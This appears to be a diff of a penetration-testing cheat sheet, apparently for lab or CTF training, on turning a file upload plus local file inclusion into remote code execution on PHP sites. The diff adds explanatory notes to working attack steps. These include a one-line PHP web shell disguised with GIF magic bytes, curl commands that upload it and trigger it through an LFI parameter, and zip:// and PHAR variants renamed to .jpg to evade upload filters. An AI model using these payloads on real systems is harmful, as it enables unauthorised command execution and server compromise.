@@ -4,13 +4,9 @@
 
 ## The Attack Concept
 
-You don't need the upload form to be vulnerable — you just need it to **accept files**. Embed PHP code inside any uploaded file (image, zip, archive metadata), then include that file via LFI. The LFI sink executes the embedded code → RCE.
+You do not need the upload form to be vulnerable. You just need it to **accept files**. Embed PHP code inside any uploaded file — an image, zip, or archive metadata — then include that file via Local File Inclusion (LFI). The LFI sink executes the embedded code, giving you Remote Code Execution (RCE).
 
-Works against any combination of:
-- "Strict" upload filter (extension whitelist, MIME check, magic bytes)
-- "Safe" upload location (no `.php` execution allowed by web server config)
-
-Because **inclusion happens through the LFI sink**, not through direct request to the uploaded file.
+This works against strict upload filters (extension whitelists, MIME checks, magic bytes) and "safe" upload locations (where `.php` execution is blocked by the web server config). Inclusion happens through the LFI sink, not through a direct request to the uploaded file.
 
 ---
 
@@ -28,6 +24,7 @@ Because **inclusion happens through the LFI sink**, not through direct request t
 ```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
+> Creates a file that starts with the GIF magic bytes (`GIF8`) to pass content-type checks. PHP ignores everything outside `<?php ... ?>` tags, so the magic bytes do not break execution. The `$_GET["cmd"]` parameter lets you run any OS command.
 
 The `GIF8` prefix is the GIF magic byte signature — passes content-type sniffing. PHP scans the rest of the file for `<?php ... ?>` tags and ignores everything outside them, so the magic bytes don't break the PHP parser.
 
@@ -37,6 +34,7 @@ The `GIF8` prefix is the GIF magic byte signature — passes content-type sniffi
 ```bash
 curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.gif"
 ```
+> Uploads `shell.gif` as a multipart form POST. The `-F` flag sends a file upload. Replace `upload.php` and `uploadFile` with the actual endpoint and field name found in the app's source.
 
 ### Find the path
 Inspect the page where uploads are referenced (`/settings.php`, `/profile`, etc.):
@@ -55,6 +53,7 @@ If hidden, fuzz common upload dirs:
 curl -sk "http://TARGET/index.php?language=./profile_images/shell.gif&cmd=id"
 # → uid=33(www-data)
 ```
+> Includes the uploaded file via the LFI parameter. PHP executes the embedded shell code and runs the `id` command. Adjust the relative path if the app uses a directory prefix — try `../profile_images/shell.gif` if the direct path fails.
 
 > The path needs to make sense relative to the LFI sink's working dir. If a prefix is added, traverse: `../profile_images/shell.gif`. If extension appended, the wrappers from Section 5 may help.
 
@@ -76,6 +75,7 @@ curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.jpg"
 #    %23 = '#' (URL-encoded) — references the inner file inside the archive
 curl -sk "http://TARGET/index.php?language=zip://./profile_images/shell.jpg%23shell&cmd=id"
 ```
+> Packages a PHP shell inside a zip file renamed to `.jpg`. The `zip://` wrapper extracts and executes the inner `shell.php` file. `%23` is the URL-encoded `#` character that separates the archive path from the inner filename.
 
 Use when Method 1 fails — for example, if the file is read but PHP-included content isn't being parsed properly because of file structure issues.
 
@@ -100,6 +100,7 @@ $phar->stopBuffering();
 php --define phar.readonly=0 shell.php
 mv shell.phar shell.jpg    # disguise as image
 ```
+> Builds the PHAR locally (`phar.readonly=0` is only needed on the build side) and renames it to `.jpg` so it passes an image upload filter — run this on your attack host, not the target.
 
 ### Upload + trigger
 ```bash
